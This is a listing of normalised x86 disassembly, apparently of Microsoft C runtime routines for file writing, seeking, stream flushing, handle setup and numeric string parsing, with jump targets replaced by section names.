mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_41c09b
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_41c277
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_41c277
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_41c09b
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_416358
push 0x10
push r--data
call sub_4143e0
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_410d01
and [ eax ] 0x0
call sub_410cee
mov [ eax ] 0x9
call sub_410d01
mov [ eax ] edi
call sub_410cee
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_40edf4
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_414425
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_4176ed
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_410cee
mov [ eax ] 0x9
call sub_410d01
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_415c25
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41642a
mov eax [ ebp - 0x1c ]
sub_416434
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_40fd92
pop ecx
push eax
call sub_416358
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_41649c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_416434
pop ecx
test eax eax
je r-xdata
push esi
call sub_4164e4
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_40fd92
push eax
call sub_41c2cb
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_4164e4
push 0x14
push r--data
call sub_4143e0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_417d23
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4165b5
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_414425
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_414a22
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_416586
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_41649c
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_41649c
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_4165c7
push 0x54
push r--data
call sub_4143e0
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_413f18
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_413f18
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_414425
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_41b1a8
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_41b1a8
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_41681b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_417676
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_410cee
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_410d14
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_416890
push 0x10
push r--data
call sub_4143e0
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_410d01
and [ eax ] 0x0
call sub_410cee
mov [ eax ] 0x9
call sub_410d01
mov [ eax ] edi
call sub_410cee
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_40edf4
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_414425
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_4176ed
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_410cee
mov [ eax ] 0x9
call sub_410d01
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41681b
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416962
mov eax [ ebp - 0x1c ]
sub_41696c
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_416a96
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41c3ac
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_40e1e0
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_416a96
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
xor ecx ecx
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x6c ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e1e0
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_41715e ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov cl al
sub cl 0x31
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_41d9a1
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp al 0x63
jle r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp al 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
add eax ecx
mov ebx eax
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
movzx ecx [ ebx + 0xa ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x32 ]
mov esi ecx
mov edx 0x7fff
xor esi eax
and eax edx
and ecx edx
and esi 0x8000
mov edi 0x7fff
lea edx [ ecx + eax ]
mov [ ebp - 0x70 ] esi
movzx edx dx
cmp ax di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp cx di
jae r-xdata
mov edi 0xbffd
cmp dx di
ja r-xdata
mov esi 0x3fbf
cmp dx si
ja r-xdata
xor esi esi
cmp ax si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp cx si
jne r-xdata
inc edx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc edx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
inc edi
inc edi
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] ecx
test ecx ecx
jle r-xdata
add edx 0xc002
test dx dx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add edx 0xffff
test dx dx
jge r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x2c ] cx
ja r-xdata
mov eax edx
neg eax
movzx esi ax
add edx esi
test dx dx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov ecx esi
add esi esi
or esi eax
shr ecx 0x1f
lea eax [ edi + edi ]
or eax ecx
add edx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test dx dx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x5c ]
movzx ecx [ ecx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax ecx
mov ecx [ edi - 0x4 ]
lea esi [ ecx + eax ]
cmp esi ecx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov ecx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp dx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or edx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] dx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x22 ] cx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc edx
jmp r-xdata
sub_41718e
push 0xc
push r--data
call sub_4143e0
push 0xe
call sub_417d23
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4171f5
call sub_414425
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_410135
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_410135
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_417200
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
